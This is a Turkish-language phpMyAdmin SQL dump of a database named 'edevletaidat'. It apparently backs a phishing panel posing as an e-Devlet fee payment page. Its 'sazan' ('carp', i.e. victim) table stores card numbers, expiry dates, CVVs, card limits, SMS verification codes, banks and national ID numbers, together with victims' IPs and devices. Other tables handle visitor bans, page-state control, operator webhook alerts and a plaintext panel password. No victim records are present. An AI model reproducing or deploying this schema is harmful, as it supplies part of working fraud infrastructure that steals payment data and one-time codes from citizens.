-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Anamakine: 127.0.0.1
-- Üretim Zamanı: 02 Mar 2023, 17:53:53
-- Sunucu sürümü: 10.4.27-MariaDB
-- PHP Sürümü: 8.2.0

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `edevletaidat`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `back`
--

CREATE TABLE `back` (
  `back` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ban`
--

CREATE TABLE `ban` (
  `ban` varchar(255) NOT NULL,
  `ulke` text NOT NULL,
  `date` text NOT NULL,
  `cihaz` varchar(255) NOT NULL,
  `tarayici` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `hata1`
--

CREATE TABLE `hata1` (
  `hata1` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `hata2`
--

CREATE TABLE `hata2` (
  `hata2` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `hata3`
--

CREATE TABLE `hata3` (
  `hata3` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ips`
--

CREATE TABLE `ips` (
  `id` bigint(20) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `lastOnline` bigint(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `paneldekiler`
--

CREATE TABLE `paneldekiler` (
  `ip` text NOT NULL,
  `tarih` text NOT NULL,
  `tarayici` varchar(255) NOT NULL,
  `durum` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sazan`
--

CREATE TABLE `sazan` (
  `id` int(11) NOT NULL,
  `date` varchar(255) NOT NULL,
  `kk` varchar(255) DEFAULT NULL,
  `sonkul` varchar(255) DEFAULT NULL,
  `cvv` varchar(255) DEFAULT NULL,
  `kartlimit` int(11) NOT NULL,
  `sms` varchar(255) DEFAULT NULL,
  `now` varchar(255) NOT NULL DEFAULT 'Anasayfa',
  `back` int(11) NOT NULL DEFAULT 0,
  `ip` varchar(255) NOT NULL,
  `lastOnline` bigint(20) DEFAULT NULL,
  `banka` varchar(255) DEFAULT NULL,
  `tc` varchar(255) NOT NULL,
  `cihaz` varchar(255) NOT NULL,
  `tarayici` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `site`
--

CREATE TABLE `site` (
  `id` int(11) NOT NULL,
  `pass` text NOT NULL,
  `kart_sesi` int(11) NOT NULL DEFAULT 0,
  `sms_sesi` int(11) NOT NULL DEFAULT 0,
  `webhook` int(11) NOT NULL,
  `webhookURL` varchar(255) NOT NULL,
  `tutar` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Tablo döküm verisi `site`
--

INSERT INTO `site` (`id`, `pass`, `kart_sesi`, `sms_sesi`, `webhook`, `webhookURL`, `tutar`) VALUES
(1, 'lenard', 0, 0, 0, '.', '150');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sms`
--

CREATE TABLE `sms` (
  `sms` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tebrik`
--

CREATE TABLE `tebrik` (
  `tebrik` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `ips`
--
ALTER TABLE `ips`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `sazan`
--
ALTER TABLE `sazan`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `site`
--
ALTER TABLE `site`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `ips`
--
ALTER TABLE `ips`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `sazan`
--
ALTER TABLE `sazan`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- Tablo için AUTO_INCREMENT değeri `site`
--
ALTER TABLE `site`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
